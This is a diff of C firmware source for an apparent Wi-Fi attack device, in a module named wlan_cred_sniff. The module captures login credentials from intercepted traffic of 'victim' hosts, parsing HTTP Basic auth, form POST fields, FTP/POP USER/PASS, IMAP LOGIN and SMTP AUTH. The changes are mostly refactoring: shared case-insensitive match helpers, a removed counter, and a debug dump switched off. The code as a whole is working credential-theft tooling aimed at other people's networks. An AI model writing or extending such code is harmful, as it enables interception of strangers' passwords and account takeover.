@@ -1,4 +1,5 @@
 #include "wlan_cred_sniff.h"
+#include "wlan_parse_helpers.h"
 
 #include <esp_log.h>
 #include <furi.h>
@@ -7,9 +8,11 @@
 
 #define TAG "WlanCredSniff"
 
-// Während Debug: jeden POST-Request samt Body loggen, um unbekannte Feldnamen
-// und Encodings zu entdecken. Auf 0 setzen wenn fertig debugged.
-#define WLAN_CRED_DEBUG_POST 1
+// Debug-Schalter: dumpt jeden POST-Request samt Body in ESP_LOG und legt
+// zusätzlich einen "POST"-Eintrag pro Request in den Cred-Ring, um unbekannte
+// Feldnamen und Encodings auf dem Gerät durchscrollen zu können. Standard 0;
+// nur temporär zum Reverse-Engineern fremder Login-Formulare einschalten.
+#define WLAN_CRED_DEBUG_POST 0
 
 // ---------------------------------------------------------------------------
 // Live-Credential-Dissektor.
@@ -18,16 +21,14 @@
 //   - wlan_cred_sniff_feed_eth() läuft ausschliesslich aus dem lwIP-
 //     tcpip_thread (single producer). Es allokiert nichts, blockiert nicht,
 //     hält keine Locks und ruft keine lwIP-/esp_wifi_-APIs auf.
-//   - drain/snapshot/total/count_for_ip laufen ausschliesslich aus dem
-//     GUI/Tick-Thread (single consumer).
+//   - drain/snapshot laufen ausschliesslich aus dem GUI/Tick-Thread (single
+//     consumer).
 //   - Der Ring ist ein SPSC-Ring mit Per-Slot-Seqlock (analog dem hook_seq-
 //     Idiom in wlan_netcut.c) — der Consumer sieht nie einen halb-geschriebenen
 //     Eintrag, im Worst Case verliert er einen.
 //   - Die DNS-Dedup-Bitmap und der pending-USER-Cache werden nur vom Producer
 //     angefasst → keine Synchronisation nötig.
 // ---------------------------------------------------------------------------
-
-#define TAG "WlanCredSniff"
 
 #define DNS_DEDUP_BITS 512 // 64 Byte Bitmap → grob ~hunderte unique Queries pro Session
 #define CRED_PENDING_SLOTS 8 // USER→PASS / AUTH-LOGIN-Korrelation pro (ip,port)
@@ -64,7 +65,6 @@ struct WlanCredSniff {
     WlanCredEntry ring[WLAN_CRED_RING_SIZE];
     volatile uint32_t write_seq; // Producer-only Zähler; Slot = (write_seq-1) % SIZE
     uint32_t drain_cursor; // Consumer-only: zuletzt gedrainte seq
-    volatile uint32_t total; // Lifetime-Zähler
     volatile bool armed;
 
     // Producer-private:
@@ -83,35 +83,16 @@ static const uint8_t* mem_chr(const uint8_t* p, int len, uint8_t c) {
     return NULL;
 }
 
-static bool ci_match(const uint8_t* a, const char* b, int n) {
-    for(int i = 0; i < n; i++) {
-        char x = (char)a[i];
-        char y = b[i];
-        if(x >= 'A' && x <= 'Z') x = (char)(x + 32);
-        if(y >= 'A' && y <= 'Z') y = (char)(y + 32);
-        if(x != y) return false;
-    }
-    return true;
-}
-
 static bool ci_eq(const uint8_t* a, int alen, const char* b) {
     int bl = (int)strlen(b);
     if(alen != bl) return false;
-    return ci_match(a, b, alen);
+    return wlan_ci_match(a, b, alen);
 }
 
 static const uint8_t* mem_find(const uint8_t* hay, int haylen, const char* needle, int nlen) {
     if(nlen <= 0 || haylen < nlen) return NULL;
     for(int i = 0; i + nlen <= haylen; i++)
         if(memcmp(hay + i, needle, (size_t)nlen) == 0) return hay + i;
-    return NULL;
-}
-
-static const uint8_t* ci_mem_find(const uint8_t* hay, int haylen, const char* needle) {
-    int nlen = (int)strlen(needle);
-    if(nlen <= 0 || haylen < nlen) return NULL;
-    for(int i = 0; i + nlen <= haylen; i++)
-        if(ci_match(hay + i, needle, nlen)) return hay + i;
     return NULL;
 }
 
@@ -233,7 +214,7 @@ static bool form_value(const uint8_t* body, int len, const char* key, char* out,
     int klen = (int)strlen(key);
     for(int i = 0; i + klen + 1 <= len; i++) {
         if(i > 0 && body[i - 1] != '&' && body[i - 1] != '?') continue;
-        if(!ci_match(body + i, key, klen)) continue;
+        if(!wlan_ci_match(body + i, key, klen)) continue;
         if(body[i + klen] != '=') continue;
         const uint8_t* v = body + i + klen + 1;
         int rem = len - (int)(v - body);
@@ -340,7 +321,6 @@ static void cred_push(
 
     __atomic_thread_fence(__ATOMIC_RELEASE);
     __atomic_store_n(&e->seq, my_seq, __ATOMIC_RELEASE);
-    __atomic_fetch_add(&cs->total, 1u, __ATOMIC_RELAXED);
 }
 
 // ===========================================================================
@@ -562,7 +542,7 @@ static void parse_http(
     {
         const uint8_t* av;
         int avl;
-        if(find_header(d, len, "authorization", &av, &avl) && avl > 6 && ci_match(av, "basic ", 6)) {
+        if(find_header(d, len, "authorization", &av, &avl) && avl > 6 && wlan_ci_match(av, "basic ", 6)) {
             const uint8_t* b64 = av + 6;
             int b64l = avl - 6;
             while(b64l > 0 && (*b64 == ' ' || *b64 == '\t')) {
@@ -632,7 +612,7 @@ static void parse_http(
         }
 #endif
 
-        bool urlencoded = ct[0] && ci_mem_find((const uint8_t*)ct, (int)strlen(ct),
+        bool urlencoded = ct[0] && wlan_ci_mem_find((const uint8_t*)ct, (int)strlen(ct),
                                                "x-www-form-urlencoded") != NULL;
         if(body && urlencoded && body_len > 0) {
             // Liste lieber etwas weiter halten — viele Router-Firmwares benutzen
@@ -666,6 +646,7 @@ static void parse_http(
             }
         }
 
+#if WLAN_CRED_DEBUG_POST
         // Debug: jeden POST als eigenen "POST"-Eintrag in den Ring legen, mit
         // Pfad in user und dem Body (oder "(split)" wenn Body in einem späteren
         // Segment kommt) als raw_body. So kann der User auf dem Gerät durch
@@ -687,6 +668,7 @@ static void parse_http(
             snprintf(raw_buf, sizeof(raw_buf), "(empty body, ct=%s)", ct[0] ? ct : "?");
         }
         cred_push(cs, "POST", sip, dip, dport, host_disp, path_user, ct, raw_buf);
+#endif
     }
 }
 
@@ -701,11 +683,11 @@ static void parse_user_pass(
     const uint8_t* d,
     int len) {
     if(len < 5) return;
-    if(ci_match(d, "USER ", 5)) {
+    if(wlan_ci_match(d, "USER ", 5)) {
         char u[WLAN_CRED_STR_MAX];
         line_arg(d, len, 5, u, sizeof(u));
         if(u[0]) pending_store(cs, sip, sport, PEND_HAVE_USER, u);
-    } else if(ci_match(d, "PASS ", 5)) {
+    } else if(wlan_ci_match(d, "PASS ", 5)) {
         char p[WLAN_CRED_STR_MAX];
         line_arg(d, len, 5, p, sizeof(p));
         if(!p[0]) return;
@@ -727,7 +709,7 @@ static void parse_imap(
     if(!sp1) return;
     const uint8_t* p = sp1 + 1;
     int rem = ll - (int)(p - d);
-    if(rem < 6 || !ci_match(p, "LOGIN ", 6)) return;
+    if(rem < 6 || !wlan_ci_match(p, "LOGIN ", 6)) return;
     p += 6;
     rem -= 6;
     char u[WLAN_CRED_STR_MAX], pw[WLAN_CRED_STR_MAX];
@@ -749,14 +731,14 @@ static void parse_smtp(
     if(ll > 0 && d[ll - 1] == '\r') ll--;
     if(ll < 4) return;
 
-    if(ci_match(d, "AUTH ", 5) && ll > 5) {
+    if(wlan_ci_match(d, "AUTH ", 5) && ll > 5) {
         const uint8_t* p = d + 5;
         int rem = ll - 5;
         while(rem > 0 && (*p == ' ' || *p == '\t')) {
             p++;
             rem--;
         }
-        if(rem >= 6 && ci_match(p, "PLAIN ", 6)) {
+        if(rem >= 6 && wlan_ci_match(p, "PLAIN ", 6)) {
             const uint8_t* b64 = p + 6;
             int b64l = rem - 6;
             while(b64l > 0 && *b64 == ' ') {
@@ -788,7 +770,7 @@ static void parse_smtp(
             }
             return;
         }
-        if(rem >= 5 && ci_match(p, "LOGIN", 5)) {
+        if(rem >= 5 && wlan_ci_match(p, "LOGIN", 5)) {
             const uint8_t* q = p + 5;
             int ql = rem - 5;
             while(ql > 0 && *q == ' ') {
@@ -959,22 +941,6 @@ uint32_t wlan_cred_sniff_snapshot(WlanCredSniff* cs, WlanCredEntry* out, uint32_
     return n;
 }
 
-uint32_t wlan_cred_sniff_total(WlanCredSniff* cs) {
-    return cs ? __atomic_load_n(&cs->total, __ATOMIC_RELAXED) : 0;
-}
-
-uint32_t wlan_cred_sniff_count_for_ip(WlanCredSniff* cs, uint32_t ip) {
-    if(!cs || ip == 0) return 0;
-    uint32_t produced = __atomic_load_n(&cs->write_seq, __ATOMIC_ACQUIRE);
-    uint32_t avail = produced > WLAN_CRED_RING_SIZE ? WLAN_CRED_RING_SIZE : produced;
-    uint32_t cnt = 0;
-    for(uint32_t k = 0; k < avail; k++) {
-        WlanCredEntry e;
-        if(slot_read(cs, produced - k, &e) && e.victim_ip == ip) cnt++;
-    }
-    return cnt;
-}
-
 void wlan_cred_sniff_set_armed(WlanCredSniff* cs, bool armed) {
     if(!cs) return;
     if(armed) {
@@ -998,10 +964,9 @@ void wlan_cred_sniff_push_log(WlanCredSniff* cs, uint32_t client_ip, const char*
 }
 
 void wlan_cred_sniff_push_inject(
-    WlanCredSniff* cs, uint32_t server_ip, uint32_t victim_ip, uint16_t victim_port,
+    WlanCredSniff* cs, uint32_t server_ip, uint32_t victim_ip,
     const char* host, const char* path) {
     if(!cs) return;
-    (void)victim_port;
     char host_buf[WLAN_CRED_STR_MAX];
     if(host && host[0]) {
         copy_cstr(host_buf, sizeof(host_buf), host);
